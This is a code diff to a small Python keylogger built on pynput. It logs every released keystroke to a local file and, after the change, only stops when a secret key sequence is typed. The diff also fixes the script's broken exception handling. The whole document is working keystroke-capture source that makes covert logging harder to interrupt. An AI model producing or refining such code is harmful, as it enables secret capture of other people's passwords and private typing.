@@ -1,4 +1,9 @@
 from pynput.keyboard import Listener, Key
+from collections import deque
+# import pyAesCrypt
+
+password = ['t', 'd', 'k', 'Key.enter', 'Key.shift']
+atualChars = deque(maxlen=5)
 
 def log(key):
     with open("log.txt", "a") as file_log:
@@ -7,9 +12,11 @@ def log(key):
 def monitor(key):
     try:
         log(key.char)
-    else:
-        log(srt(key))
-    if key == Key.esc:
+        atualChars.append(key.char)
+    except:
+        log(" #" + str(key) + "# ")
+        atualChars.append(str(key))
+    if "".join(password) == "".join(atualChars):
         return False
 
 with Listener(on_release=monitor) as listener:
